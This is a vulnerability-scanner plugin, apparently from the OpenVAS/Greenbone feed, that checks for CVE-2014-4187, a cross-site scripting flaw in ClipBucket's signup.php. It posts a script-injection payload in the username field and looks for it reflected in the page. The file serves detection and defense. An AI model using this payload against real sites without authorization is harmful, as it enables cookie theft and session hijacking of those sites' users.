CPE = "cpe:/a:clipbucket_project:clipbucket";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804641" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_cve_id( "CVE-2014-4187" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2014-06-18 11:17:33 +0530 (Wed, 18 Jun 2014)" );
	script_name( "ClipBucket 'Username' Parameter Cross-Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with ClipBucket and is prone to cross-site scripting
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
  cookie or not." );
	script_tag( name: "insight", value: "Input passed via the HTTP POST parameter 'Username' to 'signup.php' script is
  not properly sanitised before returning to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "ClipBucket version 2.6 revision 738, Other versions may also be affected." );
	script_tag( name: "solution", value: "Upgrade to ClipBucket version 2.7 beta or later." );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2014/Jun/119" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/127098" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/archive/1/532432/100/0/threaded" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_clipbucket_detect.sc" );
	script_mandatory_keys( "clipbucket/Installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/clipbucket/files/Clipbucket%20V2.7/" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: http_port );
url = dir + "/signup.php";
postData = "username=\"><script>alert(document.cookie)</script>";
sndReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData, "\\r\\n" );
rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "><script>alert(document.cookie)</script>" ) && ContainsString( rcvRes, ">Clipbucket" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}
exit( 99 );

